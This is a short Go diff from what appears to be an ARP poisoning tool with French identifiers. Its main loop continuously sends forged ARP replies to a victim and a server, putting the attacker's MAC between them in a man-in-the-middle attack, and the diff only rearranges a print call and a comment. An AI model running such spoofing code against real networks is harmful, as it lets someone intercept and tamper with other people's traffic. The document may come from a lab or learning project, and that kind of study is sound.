@@ -12,16 +12,14 @@ import (
 func launchPoisoning(global *global, ctx context.Context) {
 	handle := createPoisoningHandle("eth0")
 	defer handle.Close()
-	count := 0
+	printPoisoning(10)
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		default:
 			poisoningARP(handle, global.victime_ip, global.attaquant_mac, global.serveur_ip, global.serveur_mac)
-			// probleme ici sur un des cote quand je ping parfois jai de la perte
 			poisoningARP(handle, global.serveur_ip, global.attaquant_mac, global.victime_ip, global.victime_mac)
-			printPoisoning(&count)
 			// time.Sleep(1 * time.Second)
 		}
 	}
